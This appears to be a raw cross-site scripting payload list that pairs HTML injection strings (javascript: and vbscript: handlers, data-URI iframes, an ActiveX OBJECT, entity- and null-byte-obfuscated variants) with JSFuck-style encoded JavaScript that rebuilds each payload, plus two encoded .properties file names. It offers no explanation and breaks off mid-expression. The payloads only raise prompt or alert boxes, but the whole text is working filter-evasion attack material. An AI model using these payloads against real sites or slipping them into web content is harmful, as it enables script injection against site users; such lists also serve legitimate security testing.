[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+[])[0]
<form><button formaction=javascript&colon;prompt(231)>CLICKME
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+[0]+"")[7]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+([false]+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[3]+(false+"")[2]+([false]+"")[10]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+([false]+"")[10]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:prompt(237)"></OBJECT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([false]+"")[3]+(false+"")[2]+(false+"")[1]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[3]+(false+"")[2]+(false+"")[3]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+([false]+"")[3]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+([][""]+"")[4]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([][""]+"")[2]+([false]+"")[3]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+(undefined+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+(undefined+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=java script:prompt(239)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(0)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
fsmapp.properties
(false+"")[0]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[10]+(true+"")[3]+(false+"")[3]
imaslight.properties
([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+"")[3]+(false+"")[2]+([false]+"")[10]+(false+[0]+"")[2]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[10]+(true+"")[3]+(false+"")[3]
<img src=a onerror="vbscript:msgbox 1"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+"")[1]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[3]+(false+[0]+"")[2]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=b onerror="vbs:msgbox 2"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[3]+(false+[0]+"")[2]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=c onerror="vbs:prompt(3)"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=d onerror="vbscript:prompt(4)"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[4]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="vbscript&#x003A;prompt(253)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="vb&#x63;cript:prompt(255)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="vb&#x00;scri&#x00;pt:prompt(257)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return 